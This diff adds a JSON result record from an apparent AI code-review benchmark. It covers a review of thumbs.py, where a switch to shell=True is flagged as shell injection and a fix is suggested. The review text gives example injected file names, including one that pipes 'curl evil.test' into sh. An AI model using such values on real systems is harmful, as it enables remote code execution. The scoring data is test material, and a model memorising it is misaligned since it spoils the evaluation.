@@ -1,0 +1,79 @@
+{
+  "case": "C005",
+  "pr": "C005",
+  "repo": "fixture",
+  "provider": "grok",
+  "api_base": "",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "4e469f0c6687",
+  "turns": 5,
+  "tool_calls": null,
+  "seconds": 40.0,
+  "setup_seconds": 0.0,
+  "total_seconds": 40.0,
+  "usage": {
+    "in": 30921,
+    "cache_read": 117504,
+    "cache_write": 0,
+    "out": 2119,
+    "source": "cli"
+  },
+  "cost_usd": 0.1098072,
+  "changed_files": [
+    "thumbs.py"
+  ],
+  "findings": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity": "warning",
+      "body": "**Claimed critical; verifier found:** verifier off\n\nSwitching from an argv list to `shell=True` with an f-string interpolates `upload_dir`, `name`, and `oid` into a shell command. Metacharacters in any of those values are executed by the shell (e.g. `name=\"img.png; id\"` runs `id` after `convert`).\n\nImageMagick policy delegates do not require a shell \u2014 they are enforced inside the binary for both exec and shell spawns. Restore the argv form (and keep the absolute binary path):\n\n```suggestion\n    subprocess.run(\n        [\"/usr/bin/convert\", f\"{upload_dir}/{name}\", f\"/srv/thumbs/{oid}.png\"],\n        check=True,\n    )\n```\n\nIf IM7 needs the `magick` frontend, use `[\"/usr/bin/magick\", \"convert\", src, dst]` \u2014 still without `shell=True`."
+    }
+  ],
+  "summary": "## Verdict\n\n**Critical security regression** \u2014 this change introduces shell injection by replacing a safe argv-list `subprocess.run` with `shell=True` and an interpolated command string.\n\n## Narrative\n\n`make_thumb` previously invoked ImageMagick via an argument vector (`[\"/usr/bin/convert\", src, dst]`), which does not subject `upload_dir`, `name`, or `oid` to shell parsing. The new code builds `f\"convert {upload_dir}/{name} /srv/thumbs/{oid}.png\"` and runs it with `shell=True`.\n\nAny value containing shell metacharacters (spaces, `;`, `|`, `\\$()`, backticks, etc.) in `name`, `upload_dir`, or `oid` is interpreted by the shell. Example: `name=\"x.png; curl evil.test | sh\"` runs a second command as the action user. The prior comment that `name` was validated upstream was removed; even with a regex on `name`, `upload_dir` and `oid` remain fully attacker-influenced if callers pass user-controlled paths/ids, and shell quoting still has to be correct for every metacharacter class.\n\nThe stated rationale (\"shell form needed for the imagemagick policy delegate\") does not hold: ImageMagick policy delegates are enforced inside the `convert` binary regardless of how it is spawned. Policy XML does not require a shell. If PATH resolution or IM7 binary naming (`magick convert` vs `convert`) is the real issue, keep the argv form and point at the correct absolute binary (e.g. `/usr/bin/convert` or `/usr/bin/magick`).\n\nAlso note the absolute path `/usr/bin/convert` was dropped in favor of bare `convert`, which adds PATH hijacking risk on the runner/host.\n\n## Release decision\n\n**Recommendation:** request-changes\n",
+  "verification": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity_claimed": "critical",
+      "status": "skipped",
+      "reason": "verifier off"
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 0,
+    "seconds": 0.0,
+    "verified": 0,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 1,
+    "model": "",
+    "alias": "",
+    "endpoint_kind": "",
+    "reason": "verifier off",
+    "usage": {
+      "in": 0,
+      "out": 0
+    },
+    "cost_usd": null
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C005-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 0,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
